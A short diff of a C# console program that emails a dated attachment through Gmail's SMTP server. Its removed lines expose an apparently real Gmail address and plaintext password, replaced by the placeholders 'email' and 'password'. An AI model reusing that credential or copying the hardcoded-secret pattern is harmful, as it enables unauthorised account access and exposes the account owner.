@@ -320,8 +320,8 @@ namespace ConsoleApplication29
             using (MailMessage mail = new MailMessage())
             {
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                mail.From = new MailAddress("ovedimperia@gmail.com");
-                mail.To.Add("ovedimperia@gmail.com");
+                mail.From = new MailAddress("email");
+                mail.To.Add("email");
                 int day = DateTime.Now.Day;
                 int month = DateTime.Now.Month;
                 int year = DateTime.Now.Year;
@@ -333,7 +333,7 @@ namespace ConsoleApplication29
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("ovedimperia@gmail.com", "ovedimperia1");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email", "password");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
